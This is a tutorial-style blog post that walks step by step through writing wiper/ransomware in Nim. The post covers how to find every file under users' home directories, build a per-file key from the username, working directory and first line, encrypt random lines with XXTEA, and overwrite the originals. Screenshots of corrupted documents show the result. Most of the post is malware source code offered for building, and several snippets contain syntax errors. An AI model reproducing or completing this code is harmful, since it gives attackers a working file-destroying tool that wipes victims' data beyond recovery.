# Intro

I recently came across Nimlang which is a compiled language that is kind of a hybrid between various languages, some of which are Python and Golang which are two languages that I've been a fan of. So I decided to take a dive in and create some projects. This is one of those projects: a wiper/ransomware malware that is meant to encrypt a user's files with an unretrievable key that is different for each file. The key would be a combination of 3 elements:

1. The current user's username
2. The working directory from which the binary was ran
3. The first line of the current file that's being encrypted
    * This element would be different for each file since each file's first line would be different. But when it comes to certain files, this isn't always true. For example: when it comes to PDFs, the first line is the pdf version (such as %PDF-1.4) so this would make the encryption key predictable for PDF files if all the PDF files on the machine are of the same version (this is of course assuming that the first 2 components of the key can be found, but these are simple to find). The same can be said for PE files and potentially other files as well.

# Getting Into The Code

## Recursively Searching Directories

The first thing we need is a way to recursively gather all files. For this we'll be using the [OS library](https://nim-lang.org/docs/os.html). There is indeed a function dedicated to walking through all directories and subdirectories on a system called [walkDirRec](https://nim-lang.org/docs/os.html#walkDirRec.i%2Cstring)

* include explanation & example of output for this

But I unfortunately found this after I came up with my own solution using the [walkFiles](https://nim-lang.org/docs/os.html#walkFiles.i%2Cstring) function. In order to gather files using walkFiles, we must pass the directory we want to search with a forward slash & a wild card appended to it (EX:`/*` or `/home/*`). An example of the code used and the output it produces:
 
```
import os
for i in walkFiles("/home/*/*"):
 echo i
```
* ![](/imgs/img.png)
* The reason we must use two sets of forward slashes & wildcards (`/*/*`)  is because if we only use one set, it will only search for files in the /home/ directory which doesn't contain files but rather the users' directories:
    * ![](/imgs/img2.png)

So in order to recursively gather files, we just need to keep appending `/*` and calling the walkFiles function. We could do this in a for loop which would mean we'd have to estimate the amount of subdirectories that exist. In this code, we're assuming the user has about 500 subdirectories:

```
import os
var basePath = "/home/*"
for i in 0..500:
 for file in walkFiles(basePath)
  echo file
 basePath = basePath & "/*"
```
Then the output of this would be:

* ![](/imgs/img3.png)

Now we have a way of recursively searching for files, we need to be sure we don't attempt to open & encrypt the content of the current running executable. So we need to get the name of our executable that is running & using a conditional If statement to skip encrypting it. To grab the name, we use the [OS library's paramStr() function](https://nim-lang.org/docs/os.html#paramStr) which, according to the documentation, returns the i-th command line argument where i is an integer passed to paramStr(). So we pass 0 to this and we get the filename of the currently running executable:

* ![](/imgs/img4.png)

But we get some excess along with the executable name, to get rid of that we simply have to split it by using the [strutils split() function](https://nim-lang.org/docs/strutils.html#split%2Cstring%2Cchar%2Cint), which would look like this:
```
import os
var runningFile = paramStr(0).split("/")
echo runningFile
```
Here, we're simply picking the first parameter (the executable name with the excess shown before) and we're splitting it at the forward flash (so we're removing the forward slash). This will return a list with the remaining elements, which are the period & the filename:

* ![](/imgs/img5.png)

So we need a way to choose the last element from the returned list since this would always be our executable name. We will be using the split function as a way to choose the last index:
```
import os, strutils
var runningFile = paramStr(0).split("/")[len(paramStr(0).split("/"))-1]
echo runningFile
```
Here, we're choosing the last index by performing the same split operation but with the addition of taking the length of the returned list which would return 2 (in this case. for example: if the binary was located in /home/user/ but we ran it from /home/user/docs, len() would return a greater list length). But we can't reference 2 since it'd be out of index, so we take away 1 and use that for our index.

Now running this code would return:

* ![](/imgs/img6.png)

Perfect!
So putting this together with our way of recursively searching for directories:

```
import os, strutils
#targetPaths is simply our list which will contain all filepaths to encrypt
var targetPaths = initDoublyLinkedLists[string]()
var runningFile = paramStr(0).split("/")[len(paramStr(0).split("/"))-1]
var basePath = "/home/*"
for i in 0..500:
 for file in walkFiles(basePath):
  #grabbing the bare filename without the slashes the same we grab our executable name
  if file.split("/")[len(file.split("/"))-1] == runningFile:
   echo "running binary found. skipping..."
  else:
   targetPaths.append(file)
 basePath = basePath & "/*"
```
Now we have a way to search for files recursively on a user's machine and add them to a list for encryption.

## Generating A Key

I decided to use symmetric encryption for this (specifically the [XXTEA algorithm](https://nimble.directory/pkg/xxtea)). And since I the encrypted files to be unretrievable, I thought it'd be better to have a symmetric key that changed for every file that it encrypted (or almost every file, recall that since PDFs and other files can have similar headers, this would mean the encryption key for these files would be the same). 

So I decided that the encryption key should be composed of those 3 things mentioned earlier: the first line of the file, the current user's username, and the current working directory from which the executable was ran.

To read the first line of the file we're encrypting, I chose to use the [streams library](https://nim-lang.org/docs/streams.html). In the *Read file stream example* listed on the docs, we can see it's used in a while loop in order to read the entire file, but since we only need the first line, we simply need to open a stream in read-mode, read one line from the chosen file, then close the stream:
```
import streams
var strm = newFileStream(filename, fmRead)
var key = strm.readLine
strm.close()
```

In order to acquire the user's username & current working directory, we simply need to execute system commands which can be done quite easily using the [osproc library](https://nim-lang.org/docs/osproc.html) and passing the desired command to the [execProcess function](https://nim-lang.org/docs/osproc.html#execProcess%2Cstring%2Cstring%2CopenArray%5Bstring%5D%2CStringTableRef%2Cset%5BProcessOption%5D):

```
import osproc
var username = execProcess("whoami")
var currentDir = execProcess("pwd")
```
Now combining all this, we get function:

```
import streams, osproc
proc generateKey(filename: string): string =
 var strm = newFileStream(filename, fmRead)
 var key = strm.readLine
 var strm.close()
 
 var username = execProcess("whoami")
 var currentDir = execProcess("pwd")
 
 #concatting the key, username, & current working dir
 key = key & " " & username & " " & currentDir
 return key
```

Now that we have a way to search directories for files and generate a "unique" key for each file we want to encrypt, we need a way to find the number of lines within a file so we know how many lines are available to encrypt. If the number of lines of each file that's encrypted is randomized, this would make creating a decryption tool a bit more difficult.

## Counting Lines of a File

We can determine the number of lines each file contains by simply executing the `wc -l` system command. But this returns more than we need, it also returns the path of the file:

* ![](/imgs/img7.png)

To solve this, we have 2 options:

1. We can split it on the space and choose the 0 index which would only be the number in string form
2. We can find the index of the space and return the output of the executed command and leave out the whitespace by indexing

Method one:

``` 
import strutils, osproc
proc countLines(filename: string): int =
 #we use strip() to remove the newline character which execProcess adds to the output
 var numOfLinesExcess = execProcess("wc -l" & filename).strip()
 var numOfLines = numOfLinesExcess.split(" ")[0]
 #we use parseInt from strutils to turn the string into an int
 return parseInt(numOfLines)
```

Method two:

```
import strutils, osproc
proc countLines(filename: string): int =
 var numOfLines = execProcess("wc -l" & filename).strip()
 var whiteSpaceIndex = find(numOfLines, " ")
 #we take one step back from whiteSpaceIndex to exclude it from the overal output
 return parseInt(numOfLines[0..whiteSpaceIndex-1])
```

Now that we have a way to recursively search for files, generate our key, and count the number of lines in a file so we can randomize how many lines to encrypt, we can move on to the final stage: encryption.

## Encrypting the Files

For encrypting the lines, we will be using the [XXTEA algorithm](https://nimble.directory/pkg/xxtea) and then [base64](https://nim-lang.org/docs/base64.html) encode the encrypted data, then write the base64 encoded data to the file, replacing the lines. This process can be done in one line and would look like this:
```
import base64, xxtea
proc encryptFunc(data: string, key: string): string =
 var moddedData = encode(xxtea.encrypt(data, key))
 return var
```

Then of course we need to read the lines that we want to encrypt from the file, so this would require us to call the _countLines_ function we defined in the last section to find the max number of lines we can encrypt, then generating a random number that is within the range of 1 and the max number of lines we can encrypt, then reading that number of lines from that file. This would look like this:

```
import random, os
proc bstryFiles(filename: string) =
 #initialize the randomization
 randomize()
 var maxNumOfLines = countLines(filename)
 var numOfLines = rand(1..maxNumOfLines)
 var linesToEncrypt = readLines(filename, numOfLines)
```
Now *linesToEncrypt* (which is a list) contains a random amount of lines that we will encrypt. Now we need to loop through the file and replace any lines that match with the lines in *linesToEncrypt*. We can do this with [strutil's lines iterator](https://nim-lang.org/docs/io.html#lines.i%2Cstring) which simply loops through a file, line by line. 

```
import strutils
for line in "test.pdf".lines:
 echo line
```
* Example output: 
    * ![](/imgs/img8.png)

We also need a way to loop through the content of *linesToEncrypt* to compare it to the current line of the file we are on. I tried doing this with 2 for loops but failed miserably and ended up using a variable as a counter which will start at 0 and as each iteration passes, it increases and will be compared to the length of *linesToEncrypt* in order to tell whether or not we've run out of lines in *linesToEncrypt* (pretty much a for loop but without the keyword). Then we use the same counter variable to reference the lines contained in *linesToEncrypt* & compare them to the current line we're on. We also need to call generateKey(filename) in order to generate our encryption key:

```
import random, os, strutils
proc bstryFiles(filename: string) =
 #initialize the randomization
 randomize()
 var maxNumOfLines = countLines(filename)
 var numOfLines = rand(1..maxNumOfLines)
 var linesToEncrypt = readLines(filename, numOfLines)
 var indx = 0 
 var buffer = ""
 var key = generateKey(filename)
 for line in filename.lines
  if indx <= len(linesToEncrypt)-1:
   if linesToEncrypt[indx] == line:
    # '\x0A' is equivalent of '\n'
    buffer.add(line.replace(encode(xxtea.encrypt(line, key))) & '\x0A')
    indx = indx + 1
  else:
   buffer.add(line & '\x0A')
 try:
  writeFile(filename, buffer)
 except IOError:
  echo "Cannot open file to write to it. Skipping..."
 return
```

There are some other things we added as well. We've added a variable named *buffer* which will hold the changed lines. If the line we're currently on is equal to the line contained in *linesToEncrypt* at x index, then we replace the line with an encrypted + encoded version of it & add it to the *buffer* variable. Otherwise, we add the line to the *buffer* variable as is since it isn't a line we need/want to encrypt.

After all this is done, we simply use the native *writeFile()* function in order to replace the original file with our new one with the x amount of encrypted lines.

We also implemented the try & except statements, just in case we get an IOError when attempting to overwrite a file (EX: If we don't have permission to overwrite the file) when using the **writeFile** function, we won't stop the entire program but rather echo a simple error statement and continue encrypting the rest of the files.

The output of running this looks like this:

* ![](/imgs/img9.png)

And the data in the encrypted files looks like this:

* ![](/imgs/img10.png)

Attempting to open the destroyed document in Libreoffice results in this:

* ![](/imgs/img11.png)
